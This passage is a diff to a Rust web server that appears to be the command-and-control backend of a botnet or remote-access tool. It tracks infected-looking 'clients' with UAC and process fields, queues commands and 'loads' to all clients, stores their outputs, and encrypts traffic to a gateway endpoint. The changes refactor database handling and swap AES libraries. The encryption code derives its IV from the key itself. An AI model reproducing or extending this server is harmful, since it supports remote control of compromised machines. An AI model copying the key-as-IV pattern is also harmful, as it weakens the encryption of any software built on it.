-                drop(connection); return resp_servererror();
+                return resp_servererror();
             }, 
         };
 
-        let selected_clients = client_selection_sql.unwrap().collect::<Row<>>().await;
         let mut json_clients_list = json!({});
       
-        for row in selected_clients.unwrap() {
+        for row in client_selection.collect::<Row<>>().await.unwrap() {
 
             let is_online = {
                 if value_to_u64(&row, 13) + connection_interval > get_timestamp() {
@@ -585,7 +775,7 @@ async fn api_clients_list(req_body: String) -> impl Responder {
         }
 
 
-        drop(connection); return resp_ok(json_clients_list.to_string());
+        return resp_ok(json_clients_list.to_string());
     } else {
         fprint("failure", &format!("Request was sent to /api/clients_list without authentication."));
         return resp_unauthorised();
@@ -600,23 +790,22 @@ async fn api_get_output(req_body: String) -> impl Responder {
     if key_to_string(&json, "api_secret") == api_secret {
         
         let mut connection: Conn = obtain_connection().await;
-        let output_selection_sql = connection.exec_iter(
+
+        let mut output_selection = match connection.exec_iter(
             r"SELECT * FROM outputs WHERE client_id=:client_id", 
             params! {
                 "client_id" => key_to_string(&json, "client_id")
             }
-        ).await;
-    
-        match output_selection_sql {
-            Ok(_) => (),
+        ).await {
+            Ok(result) => result,
             Err(_) => {
                 fprint("error", "(output_selection_sql) Unable to fetch outputs");
-                drop(connection); return resp_servererror();
+                return resp_servererror();
             }, 
         };
 
         let mut json_outputs_list = json!({});
-        let selected_outputs = output_selection_sql.unwrap().collect::<Row<>>().await;
+        let selected_outputs = output_selection.collect::<Row<>>().await;
 
         for row in selected_outputs.unwrap() {
    
@@ -626,14 +815,14 @@ async fn api_get_output(req_body: String) -> impl Responder {
                     "client_id": value_to_str(&row, 2),
                     "cmd_args": value_to_str(&row, 3),
                     "cmd_type": value_to_str(&row, 4),
-                    "output": encode_block(&parse_storage_read(&value_to_str(&row, 5))),
+                    "output": BASE64_STANDARD.encode(&parse_storage_read(&value_to_str(&row, 5))),
                     "time_issued": value_to_str(&row, 6),
                     "time_recieved": value_to_str(&row, 7),
                 }
             );            
         }
 
-        drop(connection); return resp_ok(json_outputs_list.to_string());
+        return resp_ok(json_outputs_list.to_string());
     } else {
         fprint("failure", &format!("Request was sent to /api/get_output without authentication."));
         return resp_unauthorised();
@@ -648,20 +837,18 @@ async fn loads_list(req_body: String) -> impl Responder {
 
     if key_to_string(&json, "api_secret") == api_secret {
         let mut connection: Conn = obtain_connection().await;
-        let load_selection_sql = connection.query_iter(r"SELECT * FROM loads").await;
     
-        match load_selection_sql {
-            Ok(_) => (),
+        let mut load_selection = match connection.query_iter(r"SELECT * FROM loads").await {
+            Ok(result) => result,
             Err(_) => {
                 fprint("error", "(load_selection_sql) Unable to fetch loads");
-                drop(connection); return resp_servererror();
+                return resp_servererror();
             }, 
         };
 
         let mut json_loads_list = json!({});
-        let selected_loads = load_selection_sql.unwrap().collect::<Row>().await;
 
-        for row in selected_loads.unwrap() {
+        for row in load_selection.collect::<Row>().await.unwrap() {
             json_loads_list[value_to_str(&row, 0)] = json!({
                 "required_amount": value_to_str(&row, 2),
                 "is_recursive": value_to_bool(&row, 2),
@@ -671,7 +858,7 @@ async fn loads_list(req_body: String) -> impl Responder {
             });            
         }
         
-        drop(connection); return resp_ok(json_loads_list.to_string());
+        return resp_ok(json_loads_list.to_string());
     } else {
         fprint("failure", &format!("Request was sent to /api/loads_list without authentication."));
         return resp_unauthorised();
@@ -688,40 +875,36 @@ async fn remove_load(req_body: String) -> impl Responder {
         let mut connection: Conn = obtain_connection().await;
 
         if is_load(&mut connection, &key_to_string(&json, "load_id")).await {
-
-            let load_removal_sql = connection.exec_drop(
+        
+            match connection.exec_drop(
                 r"DELETE FROM loads WHERE load_id = :load_id;",  
                 params! {
                     "load_id" => key_to_string(&json, "load_id"),
                 }
-            ).await;
-        
-            match load_removal_sql {
+            ).await {
                 Ok(_) => (),
                 Err(e) => {
                     fprint("error", &format!("(load_removal_sql) Unable to remove load: {}", e));
-                    drop(connection); return resp_servererror();
+                    return resp_servererror();
                 }, 
             };
-
-            let command_removal_sql = connection.exec_drop(
+        
+            match connection.exec_drop(
                 r"DELETE FROM commands WHERE load_id = :load_id;",  
                 params! {
                     "load_id" => key_to_string(&json, "load_id"),
                 }
-            ).await;
-        
-            match command_removal_sql {
+            ).await {
                 Ok(_) => (),
                 Err(e) => {
                     fprint("error", &format!("(command_removal_sql) Unable to remove commands: {}", e));
-                    drop(connection); return resp_servererror();
+                    return resp_servererror();
                 }, 
             };
             
-            drop(connection); return resp_ok(String::from("Successfully removed load."));
+            return resp_ok(String::from("Successfully removed load."));
         } else {
-            drop(connection); return resp_badrequest();
+            return resp_badrequest();
         }
     } else {
         fprint("failure", &format!("Request was sent to /api/remove_load without authentication."));
@@ -742,22 +925,20 @@ async fn statistics(req_body: String) -> impl Responder {
         let mut connection = obtain_connection().await;
         let mut connection2 = obtain_connection().await;
 
-        let command_selection_sql = connection.query_iter(r"SELECT command_id FROM commands").await;
-        match command_selection_sql {
-            Ok(_) => (),
+        let mut command_selection = match connection.query_iter(r"SELECT command_id FROM commands").await {
+            Ok(result) => result,
             Err(_) => {
                 fprint("error", "(command_selection_sql) Unable to get a list of commands.");
-                drop(connection); return resp_servererror();
+                return resp_servererror();
             }, 
         };
 
         
-        let client_selection_sql = connection2.query_iter(r"SELECT last_seen,uac,first_seen FROM clients").await;
-        match client_selection_sql {
-            Ok(_) => (),
+        let mut client_selection = match connection2.query_iter(r"SELECT last_seen,uac,first_seen FROM clients").await {
+            Ok(result) => result,
             Err(_) => {
                 fprint("error", "(client_selection_sql) Unable to get a list of clients.");
-                drop(connection2); return resp_servererror();
+                return resp_servererror();
             }, 
         };
 
@@ -771,11 +952,10 @@ async fn statistics(req_body: String) -> impl Responder {
         // Command Shit
         let mut active_command_amount: u64 = 0;
 
-
-        let selected_commands = command_selection_sql.unwrap().collect::<Row<>>().await;
+        let selected_commands = command_selection.collect::<Row<>>().await;
         for _ in selected_commands.unwrap() { active_command_amount += 1; }
 
-        let selected_clients = client_selection_sql.unwrap().collect::<Row<>>().await;
+        let selected_clients = client_selection.collect::<Row<>>().await;
         for row in selected_clients.unwrap() {
             
             if value_to_u64(&row, 2) > last_new_client {
@@ -802,7 +982,7 @@ async fn statistics(req_body: String) -> impl Responder {
             "active_commands": active_command_amount,
         });
 
-        drop(connection); drop(connection2); return resp_ok(json_to_return.to_string());
+        return resp_ok(json_to_return.to_string());
         
     } else {
         fprint("failure", &format!("Request was sent to /api/statistics without authentication."));
@@ -817,7 +997,7 @@ async fn obtain_connection() -> Conn {
     return (*CONNECTION_POOL.read().unwrap()).get_conn().await.unwrap()
 } 
 
-async fn is_client(connection: &mut Conn, client_id: &String) -> bool {
+async fn is_client(connection: &mut Conn, client_id: &str) -> bool {
 
     let client_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
         r"SELECT client_id FROM clients WHERE client_id = :client_id",
@@ -840,7 +1020,7 @@ async fn is_client(connection: &mut Conn, client_id: &String) -> bool {
 }
 
 
-async fn is_load(connection: &mut Conn, load_id: &String) -> bool { 
+async fn is_load(connection: &mut Conn, load_id: &str) -> bool { 
 
     let load_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
         r"SELECT load_id FROM loads WHERE load_id = :load_id",
@@ -859,7 +1039,7 @@ async fn is_load(connection: &mut Conn, load_id: &String) -> bool {
     }
 }
 
-async fn is_block(connection: &mut Conn, block_id: &String) -> bool { 
+async fn is_block(connection: &mut Conn, block_id: &str) -> bool { 
 
     let block_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
         r"SELECT block_id FROM blocks WHERE block_id = :block_id",
@@ -879,7 +1059,7 @@ async fn is_block(connection: &mut Conn, block_id: &String) -> bool {
 }
 
 
-async fn update_last_seen(connection: &mut Conn, client_id: &String) -> () {
+async fn update_last_seen(connection: &mut Conn, client_id: &str) -> () {
     let _: std::result::Result<Option<u64>, Error>  = connection.exec_first(
         r"UPDATE clients SET last_seen = :last_seen WHERE client_id = :client_id",
         params! {
@@ -889,7 +1069,7 @@ async fn update_last_seen(connection: &mut Conn, client_id: &String) -> () {
     ).await;
 }
 
-async fn get_last_seen(connection: &mut Conn, client_id: &String) -> u64 {
+async fn get_last_seen(connection: &mut Conn, client_id: &str) -> u64 {
 
     let last_seen_query: std::result::Result<Option<u64>, Error>  = connection.exec_first(
         r"SELECT last_seen FROM clients WHERE client_id = :client_id",
@@ -914,42 +1094,35 @@ async fn get_last_seen(connection: &mut Conn, client_id: &String) -> u64 {
     }
 }
 
-async fn get_encryption_key(connection: &mut Conn, client_id: &String) -> std::result::Result<String, GenericError> {
+async fn get_encryption_key(connection: &mut Conn, client_id: &str) -> std::result::Result<String, GenericError> {
 
-    let connection_interval =  *CONNECTION_INTERVAL.read().unwrap();
-    let encryption_key_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
-        r"SELECT encryption_key FROM clients WHERE client_id = :client_id",
+    if client_id == "N/A" {
+        return Err(GenericError::NoRows)
+    }
+
+    let encryption_key_query: std::result::Result<Option<(String, u64)>, Error>  = connection.exec_first(
+        r"SELECT encryption_key, key_expiration FROM clients WHERE client_id = :client_id",
         params! {
             "client_id" => &client_id,
         }
     ).await;
 
-    // TODO: Check for encryption key validity. If it's invalid, return error.
-
     match encryption_key_query {
         Ok(None) =>  { Err(GenericError::NoRows) },
         Ok(_) =>  { 
-            let raw_key = encryption_key_query.unwrap().unwrap();
-            let split_key: Vec<&str> = raw_key.split(".").collect();
-            let current_time = get_timestamp();
-            // if get_last_seen(&mut connection, &client_id).await + (connection_interval * 3/4) < get_timestamp() {
+            let encryption_key_query = encryption_key_query.unwrap().unwrap();
+            let encryption_key = encryption_key_query.0;
+            let expiration_time = encryption_key_query.1;
 
-            if 
-                current_time >= split_key[1].parse::<u64>().unwrap() && 
-                (get_last_seen(connection, &client_id).await + connection_interval) <= current_time
-            {
+            if expiration_time < get_timestamp() {
                 return Err(GenericError::_Expired)
             } else {
-                return Ok(String::from(split_key[0]))
+                return Ok(encryption_key)
             }
         },
-
-        Err(e) => {
-            fprint("error", &format!(
-                "At get_encryption_key: {}", 
-                e
-            ));
-            Err(GenericError::Mysql(e))
+        Err(error) => {
+            fprint("error", &format!("(get_encryption_key): {}", error));
+            Err(GenericError::Mysql(error))
         }
     }
 }
@@ -989,7 +1162,7 @@ async fn block_client(connection: &mut Conn, client_id: &str, reason: &str, ip: 
 }
 
 
-async fn is_client_blocked(connection: &mut Conn, client_id: &String, ip: &String) -> bool {
+async fn is_client_blocked(connection: &mut Conn, client_id: &str, ip: &str) -> bool {
     
     let enable_firewall = *ENABLE_FIREWALL.read().unwrap();
     let blocked_client_query: std::result::Result<Option<u64>, Error>;
@@ -1056,8 +1229,6 @@ async fn task_all_clients(cmd_args: &str, cmd_type: &str, load_id: &str) -> () {
     let mut connection2: Conn = obtain_connection().await;
     
     let selected_clients = connection2.query_iter("SELECT client_id from clients").await.unwrap().collect::<Row>().await;
-    drop(connection2);
-
     connection.query_drop("START TRANSACTION").await.unwrap();
 
     for row in selected_clients.unwrap() {       
@@ -1146,7 +1317,7 @@ async fn get_current_client_command(connection: &mut Conn, client_id: &str) -> s
             let unwrapped: (String, String, String) = command_fetch_sql.unwrap().unwrap();
             Ok((
                 unwrapped.0,
-                encode_block(&parse_storage_read(&unwrapped.1)),
+                unwrapped.1,
                 unwrapped.2,
             ))
         },
@@ -1192,7 +1363,7 @@ async fn get_command_info(connection: &mut Conn, command_id: &str) -> std::resul
 
 }
 
-async fn is_command(connection: &mut Conn, command_id: &String, client_id: &String) -> bool {
+async fn is_command(connection: &mut Conn, command_id: &str, client_id: &str) -> bool {
 
     let command_query: std::result::Result<Option<String>, Error>  = connection.exec_first(
         r"SELECT command_id FROM commands WHERE client_id = :client_id AND command_id = :command_id",
@@ -1215,7 +1386,7 @@ async fn is_command(connection: &mut Conn, command_id: &String, client_id: &Stri
     }
 }
 
-async fn is_uncompleted_load(connection: &mut Conn, client_id: &String, load_id: &String) -> bool {
+async fn is_uncompleted_load(connection: &mut Conn, client_id: &str, load_id: &str) -> bool {
     let loads_query_sql = connection.exec_drop(
         r"SELECT * FROM loads WHERE load_id NOT IN (SELECT command_id FROM outputs WHERE client_id = :client_id) AND load_id = :load_id",
         params! {
@@ -1240,7 +1411,7 @@ fn parse_storage_write(storage: &[u8]) -> String {
     let storage_id = generate(16, CHARSET);
 
     // Try decoding. If decoding fails, do nothing. If decoding succeeds, use that for the rest of the fn.
-    let parsed_storage = match decode_block(str::from_utf8(storage).unwrap()) {
+    let parsed_storage = match BASE64_STANDARD.decode(str::from_utf8(storage).unwrap()) {
         Ok(decoded_blob) => decoded_blob,
         Err(_) => storage.to_owned()
     };
@@ -1289,33 +1460,59 @@ fn get_timestamp() -> u64 {
     return since_the_epoch.as_secs()
 }
 
-async fn encrypt_string_withkey(plaintext: &str, key: &[u8]) -> std::result::Result<String, ErrorStack> {
-    let cipher = Cipher::aes_256_cbc();
 
-    let mut encrypter = Crypter::new(cipher, Mode::Encrypt, key, Some(&key[..16]))?;
-    encrypter.pad(true);
 
-    let mut ciphertext = vec![0; plaintext.len() + cipher.block_size()];
-    let count = encrypter.update(plaintext.as_bytes(), &mut ciphertext)?;
-    let final_count = encrypter.finalize(&mut ciphertext[count..])?;
+fn aes_256cbc_encrypt(data: &str, key: &[u8]) -> core::result::Result<String, symmetriccipher::SymmetricCipherError> {
 
-    ciphertext.truncate(count + final_count);
-    Ok(encode_block(ciphertext.as_slice()))
+    let mut encryptor = aes::cbc_encryptor(
+            aes::KeySize::KeySize256,
+            key,
+            &key[..16],
+            blockmodes::PkcsPadding);
+   
+    let mut final_result = Vec::<u8>::new();
+    let mut read_buffer = buffer::RefReadBuffer::new(data.as_bytes());
+    let mut buffer = [0; 4096];
+    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);
+
+    loop {
+        let result = encryptor.encrypt(&mut read_buffer, &mut write_buffer, true)?;
+
+        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
+
+        match result {
+            BufferResult::BufferUnderflow => break,
+            BufferResult::BufferOverflow => { }
+        }
+    }
+
+    Ok(BASE64_STANDARD.encode(final_result))
 }
 
+fn aes_256cbc_decrypt(encrypted_data: &str, key: &[u8]) -> core::result::Result<Vec<u8>, symmetriccipher::SymmetricCipherError> {
 
-async fn decrypt_string_withkey(ciphertext: &str, key: &[u8]) -> std::result::Result<Vec<u8>, ErrorStack> {
-    let ciphertext = decode_block(ciphertext).unwrap();
-    let cipher = Cipher::aes_256_cbc();
-    let mut decrypter = Crypter::new(cipher, Mode::Decrypt, key, Some(&key[..16]))?;
-    decrypter.pad(true);
+    let encrypted_data = BASE64_STANDARD.decode(encrypted_data).unwrap();
+    let mut decryptor = aes::cbc_decryptor(
+            aes::KeySize::KeySize256,
+            key,
+            &key[..16],
+            blockmodes::PkcsPadding);
 
-    let mut plaintext = vec![0; ciphertext.len() + cipher.block_size()];
-    let count = decrypter.update(&ciphertext, &mut plaintext)?;
-    let final_count = decrypter.finalize(&mut plaintext[count..])?;
+    let mut final_result = Vec::<u8>::new();
+    let mut read_buffer = buffer::RefReadBuffer::new(encrypted_data.as_slice());
+    let mut buffer = [0; 4096];
+    let mut write_buffer = buffer::RefWriteBuffer::new(&mut buffer);
 
-    plaintext.truncate(count + final_count);
-    Ok(plaintext)
+    loop {
+        let result = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
+        final_result.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
+        match result {
+            BufferResult::BufferUnderflow => break,
+            BufferResult::BufferOverflow => { }
+        }
+    }
+
+    Ok(final_result)
 }
 
 fn fprint(stype: &str, sformatted: &str) -> () {
@@ -1414,12 +1611,19 @@ fn argon2_hash(input: &[u8]) -> String {
     return argon2.hash_password(input, &salt).unwrap().to_string();    
 }
 
-fn verify_argon2(hash: String, input: &[u8]) -> bool {
+fn verify_argon2(hash: &str, input: &[u8]) -> bool {
 
     return Argon2::default().verify_password(
         input, &PasswordHash::parse(&hash, argon2::password_hash::Encoding::B64
     ).unwrap()).is_ok();
 }
+
+pub fn random_bytes(len: usize) -> Vec<u8> {
+    let mut buffer = vec![0; len];
+    rand::thread_rng().fill_bytes(&mut buffer);
+    buffer[..].to_vec()
+}
+
 
 // ------------------------ HTTP Responses ------------------------
 
@@ -1431,6 +1635,10 @@ fn resp_badrequest() -> HttpResponse {
     return HttpResponse::build(StatusCode::BAD_REQUEST).body("Your request was malformed. Check the information you provided alongside this request.");
 }
 
+fn resp_unsupported() -> HttpResponse {
+    return HttpResponse::build(StatusCode::UNPROCESSABLE_ENTITY).body("The information you submitted or the feature you requested isn't yet supported.");
+}
+
 fn resp_servererror() -> HttpResponse {
     return HttpResponse::build(StatusCode::INTERNAL_SERVER_ERROR).body("The server is overwhelmed or under maintinence. Retry your request at a later date.");
 }
@@ -1440,7 +1648,7 @@ fn resp_ok(message: String) -> HttpResponse {
 }
 
 async fn resp_ok_encrypted(message: &str, key: &[u8]) -> HttpResponse {
-    return HttpResponse::build(StatusCode::OK).body(encrypt_string_withkey(message, key).await.unwrap());
+    return HttpResponse::build(StatusCode::OK).body(aes_256cbc_encrypt(message, key).unwrap());
 }
 
 // ------------------------ Init Functions ------------------------
@@ -1473,11 +1681,22 @@ async fn initialize_tables(connection_pool: Pool) {
             pid INTEGER,
             last_seen INTEGER,
             first_seen INTEGER,
-            encryption_key TEXT
+            encryption_key TEXT,
+            key_expiration INT
         )  ENGINE=InnoDB;
     
         CREATE INDEX IF NOT EXISTS idx_clients_client_id ON clients (client_id);
         ").await.expect("clients table creation failed");
+
+    
+    connection.query_drop(
+        r"
+        CREATE TABLE IF NOT EXISTS purgatory (
+            request_ip TEXT,
+            encryption_key TEXT,
+            expiration_time INT
+        )  ENGINE=InnoDB;
+        ").await.expect("purgatory table creation failed");
     
     connection.query_drop(
         r"
@@ -1541,7 +1760,6 @@ async fn initialize_tables(connection_pool: Pool) {
         CREATE INDEX IF NOT EXISTS idx_blocks_ip ON blocks (ip);
         ").await.expect("blocks table creation failed");
 
-    drop(connection);
 }
 
 
@@ -1553,9 +1771,9 @@ fn compress_bytes(input: &[u8]) -> Vec<u8>{
 }
 
 fn decompress_bytes(input: &[u8]) -> Vec<u8>{
-    let mut decompressor = GzDecoder::new(input);
-    let mut decompressed_bytes: Vec<u8> = vec![];
-    decompressor.read(&mut decompressed_bytes).unwrap();
+    let mut decompressor: GzDecoder<&[u8]> = GzDecoder::new(input);
+    let mut decompressed_bytes: Vec<u8> = Vec::new();
+    decompressor.read_to_end(&mut decompressed_bytes).unwrap();
     return decompressed_bytes;
 }
 
@@ -1578,7 +1796,6 @@ async fn main() -> std::io::Result<()> {
     Command::new("ulimit")
     .arg("-n")
     .arg("524288");
-
 
     let json_config = fs::read("artifacts/configuration/server_config.json");
 
@@ -1633,6 +1850,7 @@ async fn main() -> std::io::Result<()> {
 
     *CONNECTION_POOL.write().unwrap() = connection_pool.clone();
     *CONNECTION_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "connection_interval");
+    *PURGATORY_INTERVAL.write().unwrap() = key_to_u64(&parsed_json_config, "purgatory_interval");
     *ENABLE_FIREWALL.write().unwrap() = key_to_bool(&parsed_json_config, "enable_firewall");
     *API_SECRET.write().unwrap() = key_to_string(&parsed_json_config, "api_secret");
     *PRIVATE_KEY.write().unwrap() = RsaPrivateKey::from_pkcs1_pem(&fs::read_to_string("artifacts/keys/private.pem").unwrap()).unwrap();
@@ -1646,10 +1864,6 @@ async fn main() -> std::io::Result<()> {
         format!("http://{}/gateway", key_to_string(&parsed_json_config, "host")).yellow()
     ));
     
-    let hash = argon2_hash("test".as_bytes());
-    fprint("info", &format!("{}", hash));
-    fprint("info", &format!("Verification Status: {} ", verify_argon2(hash, "test".as_bytes())));
-
     HttpServer::new(move || {
         App::new()
             .app_data(web::PayloadConfig::default().limit(100000000)) // 500mb
